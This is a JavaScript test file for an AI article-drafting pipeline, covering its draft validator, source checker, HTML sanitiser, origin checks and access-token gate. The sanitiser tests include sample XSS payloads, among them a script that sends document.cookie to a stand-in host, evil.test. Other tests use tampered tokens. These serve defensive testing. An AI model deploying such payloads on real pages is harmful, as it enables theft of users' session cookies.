/**
 * Checks for the logic that can be wrong silently.
 *
 *   node studio/test.mjs
 *
 * No framework. Pure functions only — the network and the bindings are not
 * exercised here, and the file says so rather than implying coverage it does
 * not have. The one thing this DOES prove end to end is that the Markdown
 * the Worker emits satisfies the site's content schema, which is the
 * contract most likely to break and least likely to be noticed.
 */

import assert from 'node:assert/strict';
import {
  pickTopic,
  similarity,
  validateDraft,
  buildMarkdown,
  modelChain,
  FALLBACK_MODELS,
  MAX_CHAIN,
  unfencedTags,
  checkSources,
  dangerousHtml,
} from './src/pipeline.js';
import { isSameOrigin, SECURITY_HEADERS } from './src/index.js';
import { requireAccess } from './src/access.js';

let passed = 0;
function test(name, fn) {
  try {
    fn();
    passed += 1;
    console.log(`  ok   ${name}`);
  } catch (err) {
    console.error(`  FAIL ${name}\n       ${err.message}`);
    process.exitCode = 1;
  }
}


// test() calls fn() and catches synchronously, so an async body's rejection
// would escape it and report a pass. This awaits.
async function atest(name, fn) {
  try {
    await fn();
    passed += 1;
    console.log(`  ok   ${name}`);
  } catch (err) {
    console.error(`  FAIL ${name}
       ${err.message}`);
    process.exitCode = 1;
  }
}

console.log('\nDuplicate detection');

test('near-duplicate phrasing scores above the threshold', () => {
  const s = similarity(
    'Writing better prompts in Claude',
    'How to improve your Claude prompting and write better prompts',
  );
  assert.ok(s >= 0.3, `expected a meaningful overlap, got ${s}`);
});

test('unrelated topics score near zero', () => {
  const s = similarity('PETG filament drying temperatures', 'Windows keyboard shortcuts');
  assert.equal(s, 0);
});

test('picks a queued idea when nothing clashes', () => {
  const r = pickTopic([
    { id: 1, topic: 'PLA filament guide', category: 'maker', status: 'published', title: 'PLA Filament' },
    { id: 2, topic: 'Windows keyboard shortcuts', category: 'tips', status: 'idea', title: null },
  ]);
  assert.equal(r.ok, true);
  assert.equal(r.topic.id, 2);
});

test('refuses rather than drafting a near-duplicate', () => {
  const r = pickTopic([
    {
      id: 1,
      topic: 'Run an AI model locally with Ollama',
      category: 'ai',
      status: 'published',
      title: 'Run an AI model locally with Ollama',
    },
    {
      id: 2,
      topic: 'Run an AI model locally with Ollama today',
      category: 'ai',
      status: 'idea',
      title: null,
    },
  ]);
  assert.equal(r.ok, false);
  assert.match(r.reason, /duplicate/i);
});

test('empty queue is reported, not crashed on', () => {
  const r = pickTopic([]);
  assert.equal(r.ok, false);
  assert.match(r.reason, /empty/i);
});

console.log('\nValidator — it must refuse, not repair');

const good = {
  title: 'Run a local model without melting your laptop',
  slug: 'Run A Local Model!',
  summary: 'Pick a quantisation that fits the RAM you actually have, and the model stops swapping.',
  seoTitle: 'Fit a local AI model in your RAM',
  metaDescription:
    'Choose the right quantisation so a local model fits your RAM instead of swapping to disk and crawling.',
  tags: ['AI', 'Local Models'],
  sources: ['https://docs.ollama.com/'],
  body: 'Large models swap to disk when they do not fit.\n\n## Steps\n\n1. Check your RAM.\n\n## Expected result\n\nThe model loads.',
};
const opts = { category: 'ai', topicSimilarity: 0.1 };

test('accepts a well-formed draft', () => {
  const d = validateDraft(JSON.stringify(good), opts);
  assert.equal(d.title, good.title);
});

test('strips a markdown code fence', () => {
  const d = validateDraft('```json\n' + JSON.stringify(good) + '\n```', opts);
  assert.equal(d.title, good.title);
});

test('normalises the slug', () => {
  const d = validateDraft(JSON.stringify(good), opts);
  assert.equal(d.slug, 'run-a-local-model');
});

test('lowercases and hyphenates tags', () => {
  const d = validateDraft(JSON.stringify(good), opts);
  assert.deepEqual(d.tags, ['ai', 'local-models']);
});

test('throws when there are no sources', () => {
  assert.throws(
    () => validateDraft(JSON.stringify({ ...good, sources: [] }), opts),
    /unverifiable/i,
  );
});

test('throws when a source is not a URL', () => {
  assert.throws(
    () => validateDraft(JSON.stringify({ ...good, sources: ['the ollama docs'] }), opts),
    /not a URL/i,
  );
});

test('throws on a short metaDescription', () => {
  assert.throws(
    () => validateDraft(JSON.stringify({ ...good, metaDescription: 'Too short.' }), opts),
    /50 characters/,
  );
});

test('throws on non-JSON output', () => {
  assert.throws(() => validateDraft('Sure! Here is your article...', opts), /did not return valid JSON/);
});

test('throws on a missing field', () => {
  const { body, ...withoutBody } = good;
  assert.throws(() => validateDraft(JSON.stringify(withoutBody), opts), /omitted a required field: body/);
});

test('flags first-person claims instead of silently publishing them', () => {
  const d = validateDraft(
    JSON.stringify({ ...good, body: 'I tested this for three months and my results were good. '.repeat(10) }),
    opts,
  );
  assert.ok(d.warnings.some((w) => /first-person/i.test(w)), 'expected a first-person warning');
});

test('flags a near-duplicate topic for the reviewer', () => {
  const d = validateDraft(JSON.stringify(good), { category: 'ai', topicSimilarity: 0.4 });
  assert.ok(d.warnings.some((w) => /similarity/i.test(w)));
});

console.log('\nFallback chain');

test('primary goes first', () => {
  assert.equal(modelChain('google/gemma-4-31b-it:free')[0], 'google/gemma-4-31b-it:free');
});

test('a primary that is also a fallback is not tried twice', () => {
  const c = modelChain(FALLBACK_MODELS[0]);
  assert.equal(new Set(c).size, c.length, `repeat in ${c.join(', ')}`);
  assert.equal(c[0], FALLBACK_MODELS[0]);
});

test('no fallback shares the primary vendor, or it shares the rate limit', () => {
  const vendor = (m) => m.split('/')[0];
  const clash = FALLBACK_MODELS.filter((m) => vendor(m) === vendor('google/gemma-4-31b-it:free'));
  assert.deepEqual(clash, [], `same pool as the primary: ${clash.join(', ')}`);
});

test('the chain fits what OpenRouter accepts', () => {
  // A 4th entry is HTTP 400 and breaks every run, cron included.
  assert.ok(modelChain().length <= MAX_CHAIN, `chain is ${modelChain().length}`);
});

test('no fallback is silently dropped by the cap', () => {
  // The slice in modelChain is a guard, not a budget. If the list outgrows
  // the cap, the last entry never runs and nothing says so.
  assert.ok(
    FALLBACK_MODELS.length <= MAX_CHAIN - 1,
    `${FALLBACK_MODELS.length} fallbacks but only ${MAX_CHAIN - 1} can ever be tried`,
  );
});

console.log('\nUnfenced HTML tags');

test('catches a bare tag that markdown would eat', () => {
  // This is draft 1 verbatim. It would have published with the tags invisible.
  const body = '<instructions>\nSummarise the text below.\n</instructions>\n\n<text>\nPaste here.\n</text>';
  assert.deepEqual(unfencedTags(body).sort(), ['instructions', 'text']);
});

test('a fenced block is fine, that is the fix', () => {
  assert.deepEqual(unfencedTags('```\n<instructions>\nx\n</instructions>\n```'), []);
});

test('inline code is fine too', () => {
  assert.deepEqual(unfencedTags('Wrap it in `<instructions>` like so.'), []);
});

test('comparison operators are not tags', () => {
  assert.deepEqual(unfencedTags('5 < 7 and 9 > 2, so x <= y.'), []);
});

test('the warning reaches the reviewer rather than throwing', () => {
  const d = validateDraft(
    JSON.stringify({ ...good, body: good.body + '\n\n<instructions>\ndo it\n</instructions>' }),
    opts,
  );
  assert.ok(
    d.warnings.some((w) => /unfenced tags/i.test(w)),
    `expected an unfenced-tag warning, got: ${d.warnings.join(' | ')}`,
  );
});

console.log('\nSource checking');

// A fake fetch, so these run offline and deterministically. The real thing
// is exercised by the pipeline; what needs testing is the decision logic.
const fakeFetch = (map) => async (url) => {
  const r = map[url];
  if (r === 'boom') throw Object.assign(new Error('network down'), { name: 'TypeError' });
  return { status: r.status, url: r.url || url };
};

await atest('a live source raises nothing', async () => {
  const r = await checkSources(['https://a.test/ok'], fakeFetch({ 'https://a.test/ok': { status: 200 } }));
  assert.deepEqual(r.warnings, []);
  assert.equal(r.allDead, false);
});

await atest('a 404 is named, not waved through', async () => {
  // This is draft 2 verbatim: right vendor, plausible path, dead page.
  const url = 'https://platform.openai.com/docs/guides/chat-completions/system-message';
  const r = await checkSources([url], fakeFetch({ [url]: { status: 404 } }));
  assert.equal(r.dead.length, 1);
  assert.match(r.warnings[0], /HTTP 404/);
  assert.match(r.warnings[0], /researched/);
});

await atest('every source dead is fatal, not a warning', async () => {
  const r = await checkSources(
    ['https://a.test/x', 'https://b.test/y'],
    fakeFetch({ 'https://a.test/x': { status: 404 }, 'https://b.test/y': { status: 410 } }),
  );
  assert.equal(r.allDead, true);
});

await atest('one live source among dead ones is survivable', async () => {
  const r = await checkSources(
    ['https://a.test/x', 'https://b.test/ok'],
    fakeFetch({ 'https://a.test/x': { status: 404 }, 'https://b.test/ok': { status: 200 } }),
  );
  assert.equal(r.allDead, false);
  assert.equal(r.dead.length, 1);
});

await atest('a redirect is reported as a better URL, not a fault', async () => {
  const r = await checkSources(
    ['https://old.test/page'],
    fakeFetch({ 'https://old.test/page': { status: 200, url: 'https://new.test/page' } }),
  );
  assert.deepEqual(r.dead, []);
  assert.match(r.warnings[0], /canonical/i);
  assert.match(r.warnings[0], /new\.test/);
});

// Draft 2 verbatim, and the reason the style rules can be followed at all:
// Response.url drops the fragment, so an anchored citation that never moved
// used to be reported as a redirect to itself.
await atest('an anchor is not mistaken for a redirect', async () => {
  const url = 'https://aistudio.google.com/docs/text-generation#system-instructions';
  const r = await checkSources(
    [url],
    fakeFetch({ [url]: { status: 200, url: 'https://aistudio.google.com/docs/text-generation' } }),
  );
  assert.deepEqual(r.moved, [], 'an anchored URL that did not move must not be reported as moved');
  assert.deepEqual(r.warnings, []);
});

await atest('HEAD refused falls back to GET before calling it dead', async () => {
  let calls = 0;
  const impl = async (url, opts) => {
    calls += 1;
    return opts.method === 'HEAD' ? { status: 405, url } : { status: 200, url };
  };
  const r = await checkSources(['https://picky.test/doc'], impl);
  assert.equal(calls, 2, 'expected a GET after the HEAD was refused');
  assert.deepEqual(r.dead, []);
});

await atest('an unreachable host is reported honestly, not as a 404', async () => {
  const r = await checkSources(['https://gone.test/x'], fakeFetch({ 'https://gone.test/x': 'boom' }));
  assert.match(r.dead[0], /could not be reached/);
});

console.log('\nMarkdown');

test('verification can never be anything but researched', () => {
  const d = validateDraft(JSON.stringify(good), opts);
  const md = buildMarkdown(d, { category: 'ai', publishDate: '2026-11-07' });
  assert.match(md, /^verification: researched$/m);
  assert.doesNotMatch(md, /verification: tested/);
});

test('escapes a single quote so the YAML stays valid', () => {
  const d = validateDraft(
    JSON.stringify({ ...good, title: "Ollama's quantisation, explained simply" }),
    opts,
  );
  const md = buildMarkdown(d, { category: 'ai', publishDate: '2026-11-07' });
  assert.match(md, /title: 'Ollama''s quantisation, explained simply'/);
});

console.log('\nHTML that would run on the published page');

// Markdown does not escape raw HTML — it hands it to the page. These are the
// cases that separate "showing an example" from "executing it".
test('an unfenced script tag is refused', () => {
  const r = dangerousHtml('Intro.\n\n<script>fetch("https://evil.test?c="+document.cookie)</script>\n');
  assert.deepEqual(r, ['<script>']);
});

test('a fenced script tag is fine — that is the whole point of fencing', () => {
  const r = dangerousHtml('Here is the markup:\n\n```html\n<script>alert(1)</script>\n```\n');
  assert.deepEqual(r, []);
});

test('an iframe is refused too', () => {
  assert.deepEqual(dangerousHtml('text <iframe src="https://evil.test"></iframe>'), ['<iframe>']);
});

test('an inline event handler is caught even on a harmless tag', () => {
  const r = dangerousHtml('<img src=x onerror=alert(1)>');
  assert.ok(r.includes('an inline event handler'), JSON.stringify(r));
});

test('a javascript: link is caught', () => {
  const r = dangerousHtml('<a href="javascript:alert(1)">click</a>');
  assert.ok(r.includes('a javascript: URL'), JSON.stringify(r));
});

test('ordinary prose is not blocked by the handler pattern', () => {
  // "only=" starts with "on" and would match a lazier regex; so would a
  // sentence about javascript: with no tag around it.
  const r = dangerousHtml('Set only=true in the config. The javascript: scheme is worth knowing.');
  assert.deepEqual(r, []);
});

test('a real published article passes', () => {
  const r = dangerousHtml(
    '## Heading\n\nSome text with `inline code` and a [link](https://example.com).\n\n```bash\ncurl -s https://example.com\n```\n',
  );
  assert.deepEqual(r, []);
});

test('a slug that normalises to nothing is refused, not committed as .md', () => {
  assert.throws(
    () => validateDraft(JSON.stringify({ ...good, slug: '!!!' }), opts),
    /nothing usable/,
  );
});

console.log('\nCross-site requests');

const req = (headers) => new Request('https://write.qivy.in/draft/1/publish', { method: 'POST', headers });
const here = new URL('https://write.qivy.in/draft/1/publish');

test('our own form is allowed', () => {
  assert.equal(isSameOrigin(req({ Origin: 'https://write.qivy.in' }), here), true);
});

test('another site posting with the Access cookie is refused', () => {
  assert.equal(isSameOrigin(req({ Origin: 'https://evil.test' }), here), false);
});

test('a lookalike origin is refused', () => {
  assert.equal(isSameOrigin(req({ Origin: 'https://write.qivy.in.evil.test' }), here), false);
});

test('the same host on another scheme is refused', () => {
  assert.equal(isSameOrigin(req({ Origin: 'http://write.qivy.in' }), here), false);
});

test('no Origin and no Referer is refused, not waved through', () => {
  assert.equal(isSameOrigin(req({}), here), false);
});

test('an unparseable Origin is refused', () => {
  assert.equal(isSameOrigin(req({ Origin: 'not a url' }), here), false);
});

test('Referer is accepted as the fallback it is', () => {
  assert.equal(isSameOrigin(req({ Referer: 'https://write.qivy.in/draft/1' }), here), true);
});
// The bug these exist for: the gate refused the dashboard's own Generate
// button. Measured cause — under `Referrer-Policy: no-referrer` a
// same-origin form POST sends `Origin: null` and no Referer, so the Origin
// check could never pass from our own pages.
test('our own form POST is allowed when Referrer-Policy has nulled Origin', () => {
  assert.equal(
    isSameOrigin(req({ Origin: 'null', 'Sec-Fetch-Site': 'same-origin' }), here),
    true,
  );
});

test('Origin: null on its own is refused, not parsed', () => {
  // A sandboxed iframe and a cross-origin redirect both send this.
  assert.equal(isSameOrigin(req({ Origin: 'null' }), here), false);
});

test('Sec-Fetch-Site decides even when Origin looks right', () => {
  // Script cannot set Sec-Fetch-Site, so where the two disagree the
  // browser's own account of the request wins.
  assert.equal(
    isSameOrigin(req({ Origin: 'https://write.qivy.in', 'Sec-Fetch-Site': 'cross-site' }), here),
    false,
  );
});

test('same-site is not same-origin', () => {
  // qivy.in shares a registrable domain with write.qivy.in and serves
  // model-written pages, so this must not be waved through.
  assert.equal(isSameOrigin(req({ 'Sec-Fetch-Site': 'same-site' }), here), false);
});

test('a direct navigation cannot POST its way in', () => {
  assert.equal(isSameOrigin(req({ 'Sec-Fetch-Site': 'none' }), here), false);
});

test('the pages do not set a Referrer-Policy that kills the fallback', () => {
  // no-referrer here makes the Origin branch above unreachable from our own
  // pages. This is the coupling that caused the bug, so it is asserted
  // rather than left as a comment.
  assert.notEqual(SECURITY_HEADERS['Referrer-Policy'], 'no-referrer');
  assert.equal(SECURITY_HEADERS['Referrer-Policy'], 'same-origin');
});


console.log('\nThe Access gate');

// The authentication boundary had no automated coverage at all: the README
// said so, and "it is only reachable through Cloudflare" is a reason to test
// it more carefully, not less. These build a real RS256 token with WebCrypto
// and serve a real JWKS from a stubbed fetch, so the whole path runs —
// signature, exp, aud, iss — not a mock of it.

const b64u = (bytes) =>
  btoa(String.fromCharCode(...new Uint8Array(bytes)))
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=+$/, '');

const TEAM = 'patient-silence-2588.cloudflareaccess.com';
const AUD = 'aud-for-this-app';
const envOk = { ACCESS_TEAM_DOMAIN: TEAM, ACCESS_AUD: AUD };

const pair = await crypto.subtle.generateKey(
  { name: 'RSASSA-PKCS1-v1_5', modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: 'SHA-256' },
  true,
  ['sign', 'verify'],
);
const pubJwk = { ...(await crypto.subtle.exportKey('jwk', pair.publicKey)), kid: 'key-1' };

async function token(claims = {}, { kid = 'key-1', breakSignature = false, rawSignature = null } = {}) {
  const now = Math.floor(Date.now() / 1000);
  const head = b64u(new TextEncoder().encode(JSON.stringify({ alg: 'RS256', kid })));
  const body = b64u(
    new TextEncoder().encode(
      JSON.stringify({ aud: [AUD], iss: `https://${TEAM}`, exp: now + 600, email: 'reviewer@example.com', ...claims }),
    ),
  );
  if (rawSignature !== null) return `${head}.${body}.${rawSignature}`;
  const sig = await crypto.subtle.sign('RSASSA-PKCS1-v1_5', pair.privateKey, new TextEncoder().encode(`${head}.${body}`));
  const encoded = b64u(sig);
  return `${head}.${body}.${breakSignature ? `A${encoded.slice(1)}` : encoded}`;
}

const asRequest = (t) =>
  new Request('https://write.qivy.in/', t ? { headers: { 'Cf-Access-Jwt-Assertion': t } } : {});

let served = { keys: [pubJwk] };
let fetches = 0;
globalThis.fetch = async (url) => {
  fetches += 1;
  if (!String(url).includes('/cdn-cgi/access/certs')) throw new Error(`unexpected fetch: ${url}`);
  return { ok: true, json: async () => served };
};

// Ordered deliberately: the key cache lives in module scope, so the cases
// that depend on an EMPTY cache have to run before anything fills it.
await atest('an unconfigured gate refuses everything', async () => {
  const r = await requireAccess(asRequest(await token()), { ACCESS_TEAM_DOMAIN: '', ACCESS_AUD: '' });
  assert.equal(r.ok, false);
  assert.equal(r.status, 503);
});

await atest('an empty key set is a failure, not something to cache for an hour', async () => {
  served = { keys: [] };
  const first = await requireAccess(asRequest(await token()), envOk);
  assert.equal(first.status, 503);
  // If the empty answer had been cached, the next request would be refused
  // without asking again. It must ask again.
  const before = fetches;
  served = { keys: [pubJwk] };
  const second = await requireAccess(asRequest(await token()), envOk);
  assert.ok(fetches > before, 'expected a second key fetch rather than a cached empty set');
  assert.equal(second.ok, true);
});

await atest('a valid token is let through, with its identity', async () => {
  const r = await requireAccess(asRequest(await token()), envOk);
  assert.equal(r.ok, true);
  assert.equal(r.email, 'reviewer@example.com');
});

await atest('no token at all is refused', async () => {
  const r = await requireAccess(asRequest(null), envOk);
  assert.equal(r.status, 401);
});

await atest('an expired token is refused', async () => {
  const r = await requireAccess(asRequest(await token({ exp: Math.floor(Date.now() / 1000) - 10 })), envOk);
  assert.equal(r.status, 401);
  assert.match(r.message, /expired/i);
});

await atest('a token for another Access app is refused', async () => {
  const r = await requireAccess(asRequest(await token({ aud: ['some-other-app'] })), envOk);
  assert.equal(r.status, 403);
});

await atest('a token from another team is refused', async () => {
  const r = await requireAccess(asRequest(await token({ iss: 'https://someone-else.cloudflareaccess.com' })), envOk);
  assert.equal(r.status, 403);
});

await atest('a tampered signature is refused', async () => {
  const r = await requireAccess(asRequest(await token({}, { breakSignature: true })), envOk);
  assert.equal(r.status, 401);
});

await atest('an unsigned "alg: none" style token cannot slip past', async () => {
  // The verifier never reads header.alg — it always checks RS256 against the
  // published RSA key — so a token with an empty signature simply fails.
  const r = await requireAccess(asRequest(await token({}, { rawSignature: '' })), envOk);
  assert.equal(r.ok, false);
});

await atest('a malformed signature is refused, not thrown out of the handler', async () => {
  // b64urlToBytes throws on this. Before, that escaped requireAccess and
  // left the request unhandled; an unauthenticated caller could do it.
  const r = await requireAccess(asRequest(await token({}, { rawSignature: '!!!not base64!!!' })), envOk);
  assert.equal(r.ok, false);
  assert.equal(r.status, 401);
});

await atest('a token signed by an unknown key is refused', async () => {
  const r = await requireAccess(asRequest(await token({}, { kid: 'key-does-not-exist' })), envOk);
  assert.equal(r.ok, false);
  assert.equal(r.status, 401);
});

console.log(`\n${passed} checks passed${process.exitCode ? ' — with failures above' : ''}.\n`);

// Emit a sample file so the caller can feed it to the real Astro schema.
if (process.argv.includes('--emit')) {
  const d = validateDraft(JSON.stringify(good), opts);
  process.stdout.write(buildMarkdown(d, { category: 'ai', publishDate: '2026-11-07' }));
}
